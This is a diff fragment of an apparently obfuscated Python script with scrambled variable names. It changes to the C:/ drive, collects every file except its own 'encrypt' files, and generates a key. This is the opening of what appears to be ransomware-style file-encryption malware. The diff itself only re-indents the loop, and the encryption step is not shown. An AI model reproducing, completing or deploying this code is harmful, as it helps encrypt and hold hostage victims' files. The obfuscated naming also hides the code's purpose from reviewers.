@@ -12,10 +12,10 @@ llPsjJShQHHSuOF = ["encrypt.exe", "encrypt.py", "encrypt.key"]
 HsHHBEnmSSb.chdir("C:/")
 
 for NmAnnSjKFW in HsHHBEnmSSb.listdir():
-        if NmAnnSjKFW in llPsjJShQHHSuOF:
-            continue
-        if HsHHBEnmSSb.path.isfile(NmAnnSjKFW):
-            kSjQUuSifp.append(NmAnnSjKFW)
+    if NmAnnSjKFW in llPsjJShQHHSuOF:
+        continue
+    if HsHHBEnmSSb.path.isfile(NmAnnSjKFW):
+        kSjQUuSifp.append(NmAnnSjKFW)
 
 dhsjaKwJhSUUqOIShf = AjkLShhEBmSDw.generate_key()
 
